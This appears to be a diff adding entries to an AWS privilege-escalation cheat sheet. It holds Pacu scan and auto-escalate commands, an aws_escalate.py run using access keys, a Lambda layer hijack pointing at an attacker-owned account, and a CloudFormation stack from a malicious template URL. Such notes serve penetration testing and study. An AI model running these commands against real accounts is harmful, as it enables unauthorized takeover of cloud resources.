@@ -140,10 +140,22 @@ aws iam get-role-policy --role-name  <role-name> --policy-name <policy-name>
 
 ## Privesc with overly permissive right
 
-### PACU - Scan for IAM Privesc
+### PACU - Scan & auto privesc
 
 ```
 run iam__privesc_scan
+```
+
+### PACU - Scan for privesc - offline
+
+```
+run iam__privesc_scan --offline
+```
+
+### aws_escalate.py - Scan for IAM Privesc
+
+```
+python3 aws_escalate.py --all-users --access-key-id <access_key_id> --secret-key <secret_access_key>
 ```
 
 ### Abuse iam:CreatePolicyVersion permission
@@ -271,6 +283,12 @@ aws glue --endpoint-name <target_endpoint> --public-key file://<path/to/my/publi
 
 ```
 aws cloudformation create-stack --stack-name <my_stack> --template-url http://<my-website.com/my-malicious-template.template> --role-arn <arn_of_cloudformation_service_role>
+```
+
+### Abuse Lambda Layers Package Priority - lambda:UpdateFunctionConfiguration 
+
+```
+aws lambda update-function-configuration --function-name <target-function> --layers arn:aws:lambda:<REGION>:<OUR-ACCOUNT-ID>:layer:<name-layer>:<version-number>
 ```
 
 ### Passing a role to Data Pipeline
